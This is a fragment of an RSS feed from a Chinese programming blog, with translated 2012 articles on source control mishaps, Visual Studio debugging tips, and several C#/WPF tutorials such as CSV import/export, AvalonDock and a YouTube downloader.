+第一个问题是备份，最近的备份已经是3周前的。这绝对是一个教训—你的环境真的备份了吗？一会我会在另一个故事里简单的再说到这个问题。故事的核心部分是通过Ctrl-Z来进行伪源代码控制
+他们运行他们的代码，并且不断地更新，也包括开发环境，并且使用Ctrl-Z来撤销坏的改变
+好吧。这实在令人难以置信-如果你的应用程序已经做了一些编辑。然后被关闭了。怎么办？或者PC关机了？等等—他还说他们在哪写代码，哪儿就是开发环境？记住！撤销不是源代码控制！
+&amp;nbsp;
+2。多个数据库和集成问题
+第二个故事来自Brandon Thompson，他极度不开心，因为他工作在一个有着很多数据库源的环境里，并且，这些数据库都在正在进行的开发项目下面，数据库集成非常困难，这就意味着处理多个数据库备份可能还有个在海外。。
+我们的开发团队在海外，因为他们有他们自己的数据库集，这些数据库我从没看到过。但是他们会把改变的文件发给我们来适应我们的开发环境
+我发现最痛苦的是简单重复的手工劳动仅仅是使得大家能够协同的更好。这是没有一点创新并且没有任何增值的行为，比如增加新的特性，这就导致除了干这些。没什么时间真正在写代码了。
+源代码控制是为了能够保证团队之间平稳尽量无摩擦的一起工作。它是项目的一个润滑剂，和持续集成开发还有自动部署都属于同一类。这些都是软件开发中的“面包和黄油”，是任何成功团队编写代码的基础。
+&amp;nbsp;
+3. 依赖未测试的备份
+下一个是Barry Anderson，他写了一个我们都曾经经历过的痛苦：不能从备份恢复了！事实上在Barry的故事里。几个月都没备份了。之前备份本身还是坏的。这太糟糕了。但是，对于那些依赖备份的人来说这是一个严重的疏忽。
+当然对于这个疏忽也有自己的借口。Barry解释道：
+我们的经理（不是存储团队的）后来告诉我们既没时间也没空间来测试备份了。。。
+备份是一件很重要的事情。但从备份可以恢复也是同等重要，我最近在配置大量的新环境的时候，备份本应该发生的但是就是没有发生。只有当我坚持要进行恢复测试的时候，问题才浮出水面，对于很多人来说。只有当他们真的需要从一系列的数据丢失中恢复数据的时候，才发现不能恢复了。。测试你的备份，恢复他们，不要相信任何人的说辞.
+&amp;nbsp;
+4.人工合并工具
+来自Graham Sutherland的故事讲了一个人来做机器工作的故事
+我们有一些开发人员，每一个在他们的硬盘上的都有整个项目的一个副本，每一次一个改变发生的时候，我们就会下载技术老大改变的源代码，然后使用diff工具来查看改变。然后手工更新他们。一行一行。。全靠双手。。
+这个故事比听起来还要不可思议，在源代码控制工具出现以前这确实是存在的。一个海外开发团队成员就是这样干的。随后他们这样解释：带头的开发者需要在提交前检查其他开发人员的工作进度。
+这确实是类似于之前的观点,在有多个数据库集成的情况下;我们有技术来解决这些问题!每当一个人在软件开发中从事任何劳动密集型,重复的过程,你真的不得不停下来问:“有没有更好的方法?”通常是有的。
+&amp;nbsp;
+5.剪切和粘贴版本控制
+Robin Vessey 让我产生了共鸣，因为它真的是伪VCS（Version Control System）最普遍的方式。剪切或者复制，然后粘贴到新的位置，通过这种方式会包含重复的目录或者文件。因此一般这些文件会被以日期或者其他标识符来标识时间帧。
+在Robin的故事里，他打算通过网络移动一个目录结构。
+他很简单但高效，我剪贴然后粘贴了一个完整的目录树，任何东西，通过网络发送。但这些文件留在了我这一边。却没有到达另一边。我仍然不知道为什么。
+我必须承认,我对任何剪切和粘贴文件的操作的态度是非常谨慎的,因为我看到这种情况在一个本地文件系统中发生了很多次，更不用说通过网络了，在上面的的Robin的故事,就是没有备份被恢复,因为他们一段时间后会停止备份，“因为我们没有更多的空间”。是不是感觉好像和前面某一方法很像。。
+&amp;nbsp;
+总结
+工作在一个没有源代码控制的环境下是很可怕的。现在就停止吧。伙计们，我们是很优秀，但在在源代码控制下工作是很专业的。并且现在有很多的VCS产品。托管服务，集成工具，真心是没有任何理由不把代码-包括数据库，部署在源代码控制下。
+&amp;nbsp;
+原文地址:5-ways-to-do-source-control-really
+著作权声明：本文由http://leaver.me 翻译，欢迎转载分享。请尊重作者劳动，转载时保留该声明和作者博客链接，谢谢！</description>
+    </item>
+    
+    <item>
+      <title>简单扩展方法增强代码可读性</title>
+      <link>https://leizhiyuan.github.io/2012/10/04/%E7%AE%80%E5%8D%95%E6%89%A9%E5%B1%95%E6%96%B9%E6%B3%95%E5%A2%9E%E5%BC%BA%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/</link>
+      <pubDate>Thu, 04 Oct 2012 09:03:48 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/04/%E7%AE%80%E5%8D%95%E6%89%A9%E5%B1%95%E6%96%B9%E6%B3%95%E5%A2%9E%E5%BC%BA%E4%BB%A3%E7%A0%81%E5%8F%AF%E8%AF%BB%E6%80%A7/</guid>
+      <description>本文技术含量不高，但是思路可以借鉴。。
+介绍
+当你处理计时器，时间间隔，或是其他关于日期的计算的时候。你必然会使用TimeSpan类。
+我觉得写出下面的代码可读性并不好。。 // 1个表示5小时的时间间隔 var theTimespan = new TimeSpan(0, 5, 0, 0, 0); 而下面的代码就要好一些 //一个表示5小时的时间间隔 var theTimespan = 5.Hours();  扩展方法
+使用这些扩展了int类的方法。可以使得创建TimeSpan可读性更好 public static TimeSpan Days(this int value) { return new TimeSpan(value, 0, 0, 0, 0); }
+public static TimeSpan Years(this int value) { var dt = DateTime.Now.AddYears(value); return (dt - DateTime.Now).Duration(); }
+public static TimeSpan Hours(this int value) { return new TimeSpan(0, value, 0, 0, 0); }</description>
+    </item>
+    
+    <item>
+      <title>11个高效的VS调试技巧</title>
+      <link>https://leizhiyuan.github.io/2012/10/03/11%E4%B8%AA%E9%AB%98%E6%95%88%E7%9A%84vs%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</link>
+      <pubDate>Wed, 03 Oct 2012 10:45:15 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/03/11%E4%B8%AA%E9%AB%98%E6%95%88%E7%9A%84vs%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</guid>
+      <description>介绍
+调试是软件开发周期中的一个很重要的部分，有时很有挑战性，有时候则让程序员迷惑，有时候让程序员发疯，但是。可以肯定的是，对于任何不是太那个微不足道的程序来说，调试是不可避免的。近年来，调试工具的发展已经使得很多调试任务简单省时了。
+本文总结了十个调试技巧，当你使用VS的时候可以节省你很多时间。
+1. 悬停鼠标查看表达式
+
+调试有时候很有挑战性，当你步入一个函数想看看哪块出错的时候，查看调用栈来想想值是从哪来的。另一些情况下，则需要添加一些监视表达式，或者查看局部变量列表，这通常还是花费一些时间的，但是。如果你把你鼠标指向你感兴趣的一个变量。你会发现事情简单多了。而且，类和结构体可以通过单击展开。这样。你就可以方便快捷的找到你想查看的变量了。
+2. 实时改变值  调试器不仅仅是一个分析程序崩溃或是异常结果的工具了，许多bug都可以通过步入新写的函数，检查函数是否如期望的那样运行来预防。有时候你可能会好奇“如果条件为真函数会正确运行吗”大多数情况下，根本不需要改变代码重启挑起，仅仅把鼠标悬停到一个变量上，双击值然后输入一个新值就可以了。。
+3．设置下一条语句  一个典型的调试情况就是通过单步跟踪分析为什么一个函数调用失败了。当你发现一个函数调用的另一个函数返回错误的时候你会怎么做？重启调试？有更好的方法。拖动这个黄色的语句标识到你想下一步执行的语句前就可以了。比如你刚才失败的那块，然后步入。简单，不是吗？
+4.编辑然后继续  调试一个复杂的程序，或是一个插件的时候，在一个被调用很多次的函数处发现一个错误。但是不想浪费时间停下来，重新编译然后重新调试。没问题，仅仅在该处改正代码然后继续单步就可以。VS会修正程序然后继续调试不需要重启
+注意，编辑然后继续有大量的已知限制，首先，64位代码是不行的。如果他如果为你的C#程序工作。就去工程设置的生成选项，然后目标平台为x86.不要担心。发布版的目标平台和调试的时候是分开的。可以被设置为任何平台。。
+第二．编辑然后继续改变在一个方法里应该是局部的。。如果你改变了方法签名，添加一些新方法或是类。你就不得不重启程序了。或者撤销改变来继续。改变方法也包含lambda表达式隐式修改的自动生成的代理类，因此也不能继续。
+5.方便的监视窗口  大概现代的调试器都有一个监视窗口，无论如何。VS允许你简单的添加或移除变量。单击空行，输入你的表达式按下回车，或者是在不需要的表达式上按下Delete键就可以删除了。 而且。从监视窗口你不仅仅可以看到“正常”的变量。你可以输入$handles 来追踪你的程序打开了多少句柄（可以方便的修复内存泄漏） ，输入$err 可以看到上一个函数的错误码，然后使用工具-错误信息可以看到更详细的描述，或者输入@eax（64位是@rax）来查看包含函数返回值的寄存器。
+6.带注释的反汇编  使用交互式的反汇编模式可以使得优化程序的关键部分变得很容易，VS给出对应你代码每一行的汇编指令，并且运行单步运行。同时，可以在任何位置设置断点。而且，表达式的查看和修改也像在C++代码里一样
+7.带有栈的线程窗口  调试多线程的程序是痛苦的。。或者也可以是很有趣的。取决于你的调试器。VS2010真正优美的特性是线程窗口的栈视图，通过窗口的调用栈你可以方便的总览线程。
+8.条件断点  如果你尝试通过断点再现一个罕见的事件，该情况引发了一些严重的错误。你可以添加条件断点。定义一个断点的条件，然后如果条件不成立，VS会忽略该断点
+9.内存窗口  有些bug由不正确的结构体定义引起，忽略的对齐属性等等。查看内存中的内容可以定位然后修复bug。VS提供了一个放百年的内存窗口，可以把值以8/16/32/64位的形式展示。还有浮点值。也允许实时改变他们。就像在文本编辑器里一样。
+10.转到定义  这个特性不是直接关于调试的，而是关于浏览大项目的。如果你尝试找到一些不是你自己写的代码中的错误，快速知道“这个类型是什么”或者“这个函数是干嘛的”，可以节省很多时间，VS通过一个转到定义命令方便了你。
+11.命令窗口  第十一的技巧chaau已经建议过了。确实可以节省很多时间，VS支持命令窗口，可以通过，视图-其他窗口-命令窗口来启动。一旦激活，你可以输入不同的命令来自动化调试。举个例子。你可以通过如下命令 简单的模拟MFC COleDateTime 变量。 ? dt.Format(&amp;ldquo;%Y-%m-%d %H:%M:%S&amp;rdquo;) 许可 本文包括源代码和文件在CPOL下授权。
+&amp;nbsp;
+原文地址：10plus-powerful-debugging-tricks-with-Visual-Studi
+著作权声明：本文由http://leaver.me 翻译，欢迎转载分享。请尊重作者劳动，转载时保留该声明和作者博客链接，谢谢！</description>
+    </item>
+    
+    <item>
+      <title>C#编写文件搜索器</title>
+      <link>https://leizhiyuan.github.io/2012/10/01/c#%E7%BC%96%E5%86%99%E6%96%87%E4%BB%B6%E6%90%9C%E7%B4%A2%E5%99%A8/</link>
+      <pubDate>Mon, 01 Oct 2012 11:36:29 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/10/01/c#%E7%BC%96%E5%86%99%E6%96%87%E4%BB%B6%E6%90%9C%E7%B4%A2%E5%99%A8/</guid>
+      <description>介绍 在装有Vista的机器上。我想通过一个给定的字符串来搜索我硬盘上的一个文件，该文件内容包含这个字符串序列，资源管理器是做不到的。因此，我就决定自己写吧。然后就写成这样了。。
+我做了什么
+你必须输入一个选择一个搜索目录，这样程序才知道在哪搜索文件/目录，如果你选上了“包含子目录”复选框，程序就会递归地搜索指定目录的子目录，指定的文件名可以是像 &amp;ldquo;.wav;.mp3;Christma??ree.*&amp;rdquo; 这样的字符串，程序将会列出所有的文件/目录匹配这些文件名
+你也可以使用一些限制条件来限制找到的项目，每一个限制条件可以通过选上复选框来激活，限制条件的参数可以在右边选中就行了。
+1. “Files newer than”将会列出LastWriteTime（上次修改时间）晚于指定时间的文件 2. “Files newer than”将会列出LastWriteTime（上次修改时间）早于指定时间的文件 3. &amp;ldquo;Files containing the string&amp;rdquo;仅仅列出包含字符串参数的文件。
+程序将会把字符串转换成字节序列，可以使用ASCII或者Unicode编码，取决于你的选择，然后搜索每一个出现这个字节序列的文件。
+点击Start（开始）按钮就开始搜索了。找到的项目会列在下面，如果搜索时间太长了。你可以点击Stop（停止）来停止搜索。
+如果你双击下面的一个文件。不是文件夹哦，程序将会根据关联程序打开该文件 如果你邮件一个项目，然后选择“Open Containing Folder”（打开包含文件夹）将会在资源管理器里打开包含该项目的文件夹
+如果你想要把搜索结果保存到一个文本文件。输入个分隔符分隔项目，然后点击“Write results to text file…”（保存结果到文本…）
+使用代码 1. MainWindow处理所有的界面事务 2. Searcher类提供了业务逻辑，用来搜索FileSystemInfo对象
+当用户点击Start（开始）按钮，Searcher.Start 方法就会执行，该方法开启了一个名为SearchThread 的新线程，这个线程搜索文件/目录，匹配用户输入的参数，如果找到了一个匹配的FileSystemInfo对象，它就出发一个异步的FoundInfo 事件，然后MainWindow就可以从FoundInfoEventArgs中解出FileSystemInfo对象，然后更新结果列表，当线程结束的时候，将m_thread成员对象设置为null，每一次Searcher.Start 执行的时候都会检测m_thread是否为null，因此同时不会有两个线程在运行。
+当用户点击Stop(停止)按钮的时候Searcher.Stop 方法被执行，然后设置m_stop 成员为true， Searchthread会注意到这个改变。注意本操作是线程安全的。因为布尔变量只需要一步就操作完成了
+重要：在Searcher_FoundInfo 事件处理中，MainWindow使用Invoke方法通过代理来调用this_FoundInfo 方法。通过这个方法，MainWindow是的更新结果列表的代码在MainWindow的线程里执行，而不是在Searcher的线程里，直接调用this_FoundInfo 方法会引发程序崩溃，因为Searcher_FoundInfo 事件处理和图形界面控件不同步。
+private delegate void FoundInfoSyncHandler(FoundInfoEventArgs e); private FoundInfoSyncHandler FoundInfo; ... private void MainWindow_Load(object sender, EventArgs e) { ... this.FoundInfo += new FoundInfoSyncHandler(this_FoundInfo); .</description>
+    </item>
+    
+    <item>
+      <title>CSV导入导出工具</title>
+      <link>https://leizhiyuan.github.io/2012/09/30/csv%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E5%B7%A5%E5%85%B7/</link>
+      <pubDate>Sun, 30 Sep 2012 22:33:19 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/30/csv%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA%E5%B7%A5%E5%85%B7/</guid>
+      <description>介绍
+本文介绍并且实现了在平面文件CSV和SQL server之间的导入导出功能。使用VS2005写的。使用了.net 2.0
+本文基于前一篇文章：从CSV导入数据并存储到数据库，本文包含了新功能，比如，导出功能，在数据库创建表，批量拷贝。接下来的例子中有很多注释。
+导入
+通过ODBC驱动连接到一个CSV文件，然后把文件读到一张表了（基于前面提到的那篇文章） 使用不同的编码和不同的行分隔符（基于前文） 加载CSV文件到DataSet（基于前文） 如何显示对CSV文件的预览（基于前文） 通过SqlBulkCopy的对象向SQL server转移数据，原始数据是DataSet实例
+使用结构表，基于CSV文件，创建一个新表 使用事件来处理批量拷贝的进程 导出
+浏览SQL 数据库中的用户表 使用不同的编码和分隔符 使用SqlDataReader读取数据，使用StreamWriter转移数据到平面文件
+ 使用 1. 下载工程 2. 新建一个数据库，或者使用一个存在的数据库 3. 修改软件中的数据库连接字符串，在prop.cs文件中
+public static string sqlConnString = &#34;server=(local); database=Test_CSV_impex;Trusted_Connection=True&#34;;  运行工程  一些代码段 加载CSV到DataSet中 /* *加载CSV到DataSet. * * 如果numberOfRows parameter 是 -1, 就加载所有行, 否则就加载指定数目的行 */
+public DataSet LoadCSV(int numberOfRows) { DataSet ds = new DataSet(); try { // 创建并打开ODBC连接 string strConnString = &amp;ldquo;Driver={Microsoft Text Driver (*.</description>
+    </item>
+    
+    <item>
+      <title>ListView布局管理器</title>
+      <link>https://leizhiyuan.github.io/2012/09/29/listview%E5%B8%83%E5%B1%80%E7%AE%A1%E7%90%86%E5%99%A8/</link>
+      <pubDate>Sat, 29 Sep 2012 10:14:54 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/29/listview%E5%B8%83%E5%B1%80%E7%AE%A1%E7%90%86%E5%99%A8/</guid>
+      <description>介绍 使用ListViewLayoutManager 可以控制ListView/GridView列的布局 1. 固定列宽：有着固定列宽的列 2. 范围列宽：有着最小最大宽度的列 3. 比例列宽：成比例的列宽
+范围列宽可以限制列的宽度，也包括填充列的剩余可视区域。
+据我们了解的Html中的表格和Grid空间。比例列以一个百分比来定义列宽，以下几个因素共同确定了比例列的宽度。
+ 垂直ListView滚动条的可视与否 ListView控件宽度的改变 非比例列宽度的改变  本程序支持通过XAML或是后台代码来控制ListView。如果通过XAML来控制。则允许ListViewLayoutManager 被附加到一个存在的ListView控件上。
+ConverterGridColumn 类通过接口IValueConverter 提供了对象绑定。使用ImageGridViewColumn 类则允许通过DataTemplate（数据模板）将列显示成图片等。
+在 User Setting Applied中，我展示了如何固定ListViewlieder顺序和大小
+XAML中ListView/GridView布局 固定列 下面的例子展示了通过XAML使用固定列宽控制列
+&amp;lt;ListView Name=&#34;MyListView&#34; ctrl:ListViewLayoutManager.Enabled=&#34;true&#34;&amp;gt; &amp;lt;ListView.View&amp;gt; &amp;lt;GridView&amp;gt; &amp;lt;GridViewColumn DisplayMemberBinding=&#34;{Binding Path=Name}&#34; ctrl:FixedColumn.Width=&#34;100&#34; Header=&#34;Name&#34; /&amp;gt; &amp;lt;GridViewColumn DisplayMemberBinding=&#34;{Binding Path=City}&#34; ctrl:FixedColumn.Width=&#34;300&#34; Header=&#34;City&#34; /&amp;gt; &amp;lt;/GridView&amp;gt; &amp;lt;/ListView.View&amp;gt; &amp;lt;/ListView&amp;gt;  设置附加到ListView控件上的ListViewLayoutManager 的Enabled属性为True。然后FixedColumn.Width 就会阻止鼠标拖动改变列的宽度。
+比例列
+下面的例子展示了使用XAML通过比例来控制列 
+&amp;lt;GridView&amp;gt; &amp;lt;GridViewColumn DisplayMemberBinding=&amp;#34;{Binding Path=Name}&amp;#34; ctrl:ProportionalColumn.Width=&amp;#34;1&amp;#34; Header=&amp;#34;Name&amp;#34; /&amp;gt; &amp;lt;GridViewColumn DisplayMemberBinding=&amp;#34;{Binding Path=City}&amp;#34; ctrl:ProportionalColumn.Width=&amp;#34;3&amp;#34; Header=&amp;#34;City&amp;#34; /&amp;gt; &amp;lt;/GridView&amp;gt; &amp;lt;/ListView.</description>
+    </item>
+    
+    <item>
+      <title>从数据库读取图片发生“无效的参数”异常</title>
+      <link>https://leizhiyuan.github.io/2012/09/27/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BB%E5%8F%96%E5%9B%BE%E7%89%87%E5%8F%91%E7%94%9F%E6%97%A0%E6%95%88%E7%9A%84%E5%8F%82%E6%95%B0%E5%BC%82%E5%B8%B8/</link>
+      <pubDate>Thu, 27 Sep 2012 19:47:39 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/27/%E4%BB%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%BB%E5%8F%96%E5%9B%BE%E7%89%87%E5%8F%91%E7%94%9F%E6%97%A0%E6%95%88%E7%9A%84%E5%8F%82%E6%95%B0%E5%BC%82%E5%B8%B8/</guid>
+      <description>介绍 我发现对于很多人来说，当从数据库里载入一张图片然后重新创建成一张图片显示的话会有这样一个问题&amp;mdash;-当他们尝试重新创建新的图片的时候，会抛出一个“无效的参数”异常
+因此，本文介绍该异常如何产生。并且我希望未来当我或是你发生这个错误的时候还能有所帮助。。
+背景 存储图片到数据库里面是一个很有效的想法。很多人在一些场合都会这样做。的确，这是一个很好的想法。在图片很小的情况下，或者图片不是太多。在这两种情况下，当你需要图片的时候，你会实时去加载它们。而当你不需要的时候如果从数据库里加载图片会浪费很多带宽。并使得你的程序有一些慢。
+但问题是这种方法也很容易发生错误。&amp;ndash;尤其是你使用字符串连接，然后组合到你的SQL语句里面—并且这个错误只有当你打算使用存储的信息的时候才会发生。然后，看起来似乎是你的读取代码写错了&amp;mdash;不可能—它是正常的。我在其他地方都可以的。。
+从数据库里加载图片 重数据库里读取一张图片然后转换成图片显示是很简单的。 using (SqlConnection con = DBAccess.DBCon) { using (SqlCommand cmd = new SqlCommand(&amp;ldquo;SELECT picture FROM Pictures WHERE Id=@ID&amp;rdquo;, con)) { cmd.Parameters.AddWithValue(&amp;ldquo;@ID&amp;rdquo;, Id); SqlDataReader reader = cmd.ExecuteReader(); if (reader.Read()) { byte[] data = (byte[])reader[&amp;ldquo;Picture&amp;rdquo;]; using (MemoryStream stream = new MemoryStream(bytes)) { myImage = new Bitmap(stream); } } } } 但是-如果data因为一些原因不是有效的图片，那么这一行 myImage = new Bitmap(stream); 将会抛出一个异常—无效的参数
+只有当你真正看了从数据库里返回到data里的数据-而不是简单的瞄了一眼调试器，你才能注意到是什么原因。。 {byte[21]} [0] 83 [1] 121 [2] 115 [3] 116 [4] 101 [5] 109 [6] 46 [7] 68 [8] 114 [9] 97 [10] 119 [11] 105 [12] 110 [13] 103 [14] 46 &amp;hellip; 它看起来不像是错的，所以它可能就是你想要的。-虽然21字节是一个很大的线索：你的图片可能只有21字节长？那图片可真小。。</description>
+    </item>
+    
+    <item>
+      <title>C#使用Graphics创建饼图</title>
+      <link>https://leizhiyuan.github.io/2012/09/27/c#%E4%BD%BF%E7%94%A8graphics%E5%88%9B%E5%BB%BA%E9%A5%BC%E5%9B%BE/</link>
+      <pubDate>Thu, 27 Sep 2012 13:47:25 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/27/c#%E4%BD%BF%E7%94%A8graphics%E5%88%9B%E5%BB%BA%E9%A5%BC%E5%9B%BE/</guid>
+      <description>介绍 这个程序是使用C#中的Graphics来创建一个饼图的，我已经尽我所能写的很好了。如果你有任何建议可以分享给我，这样我也能从中学习。
+使用代码 最近我迷上了Graphics类。我仅仅体验了一下Graphics的DrawPie() 和FillPie() 方法。
+最为一个简单的Demo，我创建一个有着五个文本框的窗体，一个按钮，一个图片框。一会我就把饼图画在图片框里
+ 在创建一个饼图之前，我们头脑里要有这个意识。我们不能创建一个不符合常规的圆，创建圆我们需要度数信息。
+为了转换度数。我们首先把给定的值做个求和。然后得出文本框里所有值的和。然后呢。用每个值除以总值再乘以360度。 代码如下： int i1 = Int32.Parse(textBox1.Text); int i2 = Int32.Parse(textBox2.Text); int i3 = Int32.Parse(textBox3.Text); int i4 = Int32.Parse(textBox4.Text); int i5 = Int32.Parse(textBox5.Text);
+float total = i1 + i2 + i3 + i4 + i5 ;
+float deg1 = (i1 / total) * 360; float deg2 = (i2 / total) * 360; float deg3 = (i3 / total) * 360; float deg4 = (i4 / total) * 360; float deg5 = (i5 / total) * 360; 值转换完毕后。我们可以创建Graphics类的实例了。</description>
+    </item>
+    
+    <item>
+      <title>AvalonDock 2.0入门指南第一部分</title>
+      <link>https://leizhiyuan.github.io/2012/09/26/avalondock-2.0%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</link>
+      <pubDate>Wed, 26 Sep 2012 16:38:26 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/26/avalondock-2.0%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86/</guid>
+      <description>AvalonDock 2.0可以用来为WPF创建一个类似Visual Studio的界面，深入理解如何使用AvalonDock进行开发是很重要的。
+在这个入门指南里，我将演示如何开始使用AvalonDock，下面的文章都是基于2.0版本的。并且不能用于早期的版本。
+AvalonDock是一个组合的布局模型，很多的控件都在视图上显示，一个DockingManager 类也显示在停靠区，用于可以拖拽文档和工具。
+从下面这个截图中我们可以理解AvalonDock组件
+ DockingManager 这是AvalonDock中的核心控件，它将包含的窗格排序，处理飞出的窗格，还有浮动的窗口。在上面这个图中，DockingManager 对象包含了所有空间（WPF控件），从顶部的工具栏到底部的状态栏都算。同时。DockingManager 也可以处理保存和恢复布局。
+LayoutPanel 这个面板用来管理在一个方向上的子窗口（通过Orientation属性来选择方向），并且在它们之间添加了一个大小调节控件，在一个Orientation属性是Horizontal（水平）的LayoutPanel 上，排列了三个窗格。一个LayoutAnchorablePane在左，一个LayoutDocumentPane在中间。一个LayoutDockablePane在右边。
+LayoutDockablePane 这个布局元素包含一个LayoutAnchorable对象的集合。通过它用来管理想TabControl这样的控件，在上面的截图中，LayoutDockablePanes是在左边的&amp;rsquo;Strumenti&amp;rsquo; 和 &amp;lsquo;Progetti&amp;rsquo; (工具和项目) 和在右边的&amp;rsquo;Classi&amp;rsquo; 和 &amp;lsquo;Proprieta&amp;rdquo; (类视图和属性视图)的容器，一个LayoutDockablePane可以自动隐藏，就像&amp;rsquo;Errori&amp;rsquo;(错误)和&amp;rsquo;Lista Azioni&amp;rsquo;(操作列表) and &amp;lsquo;Uscita&amp;rsquo;(输出)。并且LayoutDockablePane可以被拖动到DockingManager上，成为一个浮动窗口或者附着到它的父控件DockingManager的边缘上。
+LayoutDocumentPane 通常包含文档（DocumentContent类型）的一种窗格，但是其实也可以包含像上面提到的工具视图和类视图这样的DockableContents。在一个文档里。LayoutDocumentPane 被放置在ResizingPanel（水平方向）里。ResizingPanel则是上卖弄提到的在两个DockablePane中间的区域。注意。文档窗格是不能被移动的。
+LayoutAnchorable 一个停靠内容，是软件控件的容器，总是被包含在一个窗格里（LayoutAnchorablePane或是LayoutDocumentPane），在截图里。LayoutAnchorable是一类对象（包含一个SharpDevelop对象），工具对象，但是错误窗口（它处于自动隐藏状态，被好办在一个自动隐藏窗格里）不是。LayoutAnchorable就像它名字所暗示的那样。可以被从他的容器窗格里拖走。然后重新放置在一个存在的窗格里。或者是放置在父DockingManager的边缘，或者是放置在一个浮动窗口里（LayoutAnchorableFloatingWindow）。
+LayoutDocument 是一个仅可以被寄宿到LayoutDocumentPane的内容。它是一个特殊的内容，因为不能被停靠到边缘。仅能被放置到LayoutDocumentPane里。或者浮动在一个LayoutDocumentFloatingWindow窗口里。在途中，DocumentContent对象是program.cs&amp;rsquo; 或 &amp;lsquo;MainForm.cs&amp;rsquo; 文件视图
+**LayoutFloatingWindow **，是一个包含内容的窗口，当被拖动到一个DockingManager上面的时候，LayoutFloatingWindow（LayoutAnchorableFloatingWindow和LayoutDocumentFloatingWindow继承自他）集成在Window，总是包含一个窗格（LayoutAnchorablePane或是LayoutDocumentPane），窗格包含更多的内容（LayoutAnchorable或LayoutDocument），当用户对一个内容或是DockablePane执行拖拽，或者直接手工使用代码调用LayoutContent.Float()方法 LayoutFloatingWindow就被直接从DockingManager创建出来了。
+LayoutPane 一个基类，LayoutDockablePane和LayoutDocumentPane继承自它。它为他们提供了一些共有的属性和方法。
+LayoutContent 是LayoutAnchorable 和LayoutAnchorable类的父类。提供了共有的属性和方法。
+理解布局元素是一些属于布局模型的类而不是属于视图是很重要的。因为，他们不是继承自FrameworkElement类，取而代之。AvalonDock包含了另一些类来展示这些组件的视图。这些类通常被命名为相关联的类名+Control字串。举个例子，在布局里创建的LayoutAnchorable创建了一个LayoutAnchorableControl（继承自FrameworkElement的类），并且绑定了LayoutAnchorableControl.Model 到这个LayoutAnchorable对象上。
+每一个被创建的视图控件总是有着Model属性的布局元素。因此，重新设计一个相关视图控件的样式是可以的。
+为了开始创建一个新的.net 4/.net 4.5的解决方案。并且添加对AvalonDock.dll的引用（可以直接添加也可以使用NuGet），然后添加AD命名空间到MainWindow.xaml中。
+在根Grid下放置DockingManager组件和一个简单的布局。
+&amp;lt;Window x:Class=&#34;MainWindow&#34; xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34; xmlns:avalonDock=&#34;http://avalondock.codeplex.com&#34; Title=&#34;MainWindow&#34; Height=&#34;434&#34; Width=&#34;684&#34;&amp;gt; &amp;lt;Grid&amp;gt; &amp;lt;avalonDock:DockingManager x:Name=&#34;dockingManager&#34;&amp;gt; &amp;lt;avalonDock:LayoutRoot&amp;gt; &amp;lt;avalonDock:LayoutPanel Orientation=&#34;Horizontal&#34;&amp;gt; &amp;lt;avalonDock:LayoutDocumentPane/&amp;gt; &amp;lt;avalonDock:LayoutAnchorablePane DockWidth=&#34;150&#34;&amp;gt; &amp;lt;avalonDock:LayoutAnchorable Title=&#34;</description>
+    </item>
+    
+    <item>
+      <title>C#编写youtube下载器</title>
+      <link>https://leizhiyuan.github.io/2012/09/25/c#%E7%BC%96%E5%86%99youtube%E4%B8%8B%E8%BD%BD%E5%99%A8/</link>
+      <pubDate>Tue, 25 Sep 2012 09:33:12 +0000</pubDate>
+      
+      <guid>https://leizhiyuan.github.io/2012/09/25/c#%E7%BC%96%E5%86%99youtube%E4%B8%8B%E8%BD%BD%E5%99%A8/</guid>
+      <description>介绍 本文将会暂时如何仅仅使用C#来下载youtub视频，代码简单也容易理解，每个人都可以把它整合到自己的工程项目里。
+我没有使用任何第三方的库来完成这段代码，你所要做的仅仅是把两个.cs文件整合进你的项目里。
+使用代码 这个工程里有两个主要的类
+YouTubeVideoQuality Class（youtube视频质量类）
+public class YouTubeVideoQuality { /// &amp;lt;summary&amp;gt; /// Gets or Sets 文件名 /// &amp;lt;/summary&amp;gt; public string Videotitle: { get; set; } /// &amp;lt;summary&amp;gt; /// Gets or Sets 文件扩展 /// &amp;lt;/summary&amp;gt; public string Extention { get; set; } /// &amp;lt;summary&amp;gt; /// Gets or Sets 文件地址 /// &amp;lt;/summary&amp;gt; public string DownloadUrl { get; set; } /// &amp;lt;summary&amp;gt; /// Gets or Sets 视频地址 /// &amp;lt;/summary&amp;gt; public string VideoUrl { get; set; } /// &amp;lt;summary&amp;gt; /// Gets or Sets 文件大小 /// &amp;lt;/summary&amp;gt; public Size Dimension { get; set; } public override string ToString() { return Extention + &#34;</description>
+    </item>
+    
+    <item>
+      <title>.net显示网络连接状态图标</title>
+      <link>https://leizhiyuan.github.io/2012/09/24/.net%E6%98%BE%E7%A4%BA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E5%9B%BE%E6%A0%87/</link>
+      <pubDate>Mon, 24 Sep 2012 08:04:02 +0000</pubDate>
+      
